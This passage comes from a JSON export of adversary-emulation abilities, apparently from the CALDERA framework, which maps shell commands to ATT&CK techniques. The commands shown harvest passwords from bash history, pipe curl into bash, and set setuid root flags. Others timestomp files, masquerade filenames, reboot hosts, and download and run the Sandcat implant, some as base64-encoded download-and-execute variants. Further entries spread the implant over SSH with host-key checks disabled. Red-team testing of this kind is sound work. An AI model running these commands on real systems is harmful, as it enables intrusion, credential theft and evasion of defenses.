        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Real-time system log clearance/deletion",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b2aeb3ccd1d9eec56e86854868b67d38",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "Install sox and record microphone for n-seconds",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Record microphone",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
        "technique_id": "T1496",
        "repeatable": false
    },
    {
        "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - arp nix",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ade7be51b815cbf8908ec931256374b6",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Remote System Discovery - sweep",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1cac00896661be81f2dd242c94bb84be",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "This test restarts a macOS/Linux system via `reboot`.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "reboot",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Restart System via `reboot` - macOS/Linux",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "9c179dc2e0bea7b2340e92c574926fc2",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "This test restarts a macOS/Linux system.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "shutdown -r now",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Restart System via `shutdown` - macOS/Linux",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "25bab84a1a63926a7cf7f56e4029ef15",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "Using username,password combination from a password dump to login over SSH.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Credential Stuffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "SSH Credential Stuffing From MacOS",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "755379ed9f057c8b0f95d98bfbf3880d",
        "technique_id": "T1110.004",
        "repeatable": false
    },
    {
        "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [
                    {
                        "description": "Deploy as a blue-team agent instead of red",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgYmx1ZSAm"
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAm"
                    },
                    {
                        "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczoje2FnZW50LmV4dGVuc2lvbnN9IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgPiAje2FnZW50cy5pbXBsYW50X25hbWV9O2NobW9kICt4ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Li8je2FnZW50cy5pbXBsYW50X25hbWV9IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIC12"
                    },
                    {
                        "description": "Download with GIST C2",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpnaXN0IiAtSCAiYzI6Z2lzdCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtYzIgR0lTVCAtdg=="
                    },
                    {
                        "description": "Deploy as a P2P agent with known peers included in compiled agent",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpwcm94eV9odHRwIiAtSCAiaW5jbHVkZVByb3h5UGVlcnM6SFRUUCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLWxpc3RlblAyUCAtdg=="
                    }
                ],
                "payloads": [],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -group red -v",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Sandcat",
        "tactic": "command-and-control",
        "plugin": "sandcat",
        "ability_id": "2f34977d-9558-4c12-abad-349716777c6b",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use dropped scanner to find open popular ports",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "scanner.py"
                ],
                "command": "python3 scanner.py -i #{remote.host.ip}",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.scan",
                        "parserconfigs": [
                            {
                                "edge": "has_open_port",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {},
                                "target": "remote.host.port"
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Scan IP for ports",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "View all potential WIFI networks on host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                ],
                "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Scan WIFI networks",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "capture the contents of the screen",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Screen Capture",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "Use screencapture command to collect a full desktop screenshot\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Screencapture",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "ee00df65dba6910c97e7d910b948c6c5",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "Use screencapture command to collect a full desktop screenshot\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Screen Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Screencapture (silent)",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "67a99afec9b560aa2b636e6d74c765f1",
        "technique_id": "T1113",
        "repeatable": false
    },
    {
        "description": "Search through bash history for specifice commands we want to capture\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Bash History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Search Through Bash History",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "7784d702d69cb5219ff8fa6177b3ad81",
        "technique_id": "T1552.003",
        "repeatable": false
    },
    {
        "description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Search macOS Safari Cookies",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "8a3763d7c08e9865d77f96d033716d1c",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Security Software Discovery - ps (macOS)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e58589c66265f18565769c5254f5b5aa",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod g+xs /tmp/evilBinary",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "sudo rm /tmp/evilBinary"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Set a SetGID flag on file",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "b75167c93041f3e37b246961277b128a",
        "technique_id": "T1548.001",
        "repeatable": false
    },
    {
        "description": "This test sets the SetUID flag on a file in Linux and macOS.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "sudo rm /tmp/evilBinary"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Set a SetUID flag on file",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "13dee93f2cdf7f027718d0c517c60c8c",
        "technique_id": "T1548.001",
        "repeatable": false
    },
    {
        "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Timestomp",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f /tmp/T1070.006-creation.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Set a file's creation timestamp",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5ffa5b3b330848d39dc1728365dad61c",
        "technique_id": "T1070.006",
        "repeatable": false
    },
    {
        "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Show System Integrity Protection status (MacOS)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "043e9d0185322f75cfcecd7ff48b9814",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Show all hidden files on MacOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Show all hidden files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5827b7a328cbb3c5068ee8477c8c9be3",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "This test shuts down a macOS/Linux system using a halt.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "shutdown -h now",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Shutdown System via `shutdown` - macOS/Linux",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "e7defb71a411a050c650ab0901520109",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating Access to Chrome Login Data - MacOS",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "fd4249a81164c9014b395cf211fdeed2",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Capture the local network broadcast IP address",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Snag broadcast IP",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "b6f545ef-f802-4537-b59d-2cb19831c8ed",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Perform a packet capture",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Sniff network traffic",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Space after filename.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Space after Filename",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf /tmp/atomic-test-T1036.006"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Space After Filename",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1d3d67824a72ebdf9811b3bbcec481a0",
        "technique_id": "T1036.006",
        "repeatable": false
    },
    {
        "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Stage data from Discovery.sh",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "f16438a836c9c466cc3d56cb0262fe3f",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "copy files to staging directory",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.file.path"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            },
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Stage sensitive files",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SSH",
        "requirements": [],
        "singleton": true,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "sandcat.go-linux"
                ],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Start 54ndc47",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6",
        "technique_id": "T1021.004",
        "repeatable": false
    },
    {
        "description": "Start a new 54ndc47 agent in background",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Unix Shell",
        "requirements": [],
        "singleton": true,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "sandcat.go"
                ],
                "command": "nohup ./sandcat.go -server #{server} &",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "pkill -f sandcat"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Start 54ndc47",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e",
        "technique_id": "T1059.004",
        "repeatable": false
    },
    {
        "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Stop and unload Crowdstrike Falcon on macOS",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8b5fb5a437fad691a2764514f0c022ee",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Common Sudo enumeration methods.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo -l      ; sudo cat /etc/sudoers; sudo vim /etc/sudoers",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Sudo usage",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "dd1eadab4aa421d3a0048c3c85bf60e3",
        "technique_id": "T1548.003",
        "repeatable": false
    },
    {
        "description": "Identify System Info\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Information Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "44705da4b28c8fa57fc2a2940b34565a",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "System Network Configuration Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "334d0a8f48017677533913505003a8fc",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "netstat; who -a",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "System Network Connections Discovery Linux & MacOS",
        "tactic": "discovery",
        "plugin": "atomic",
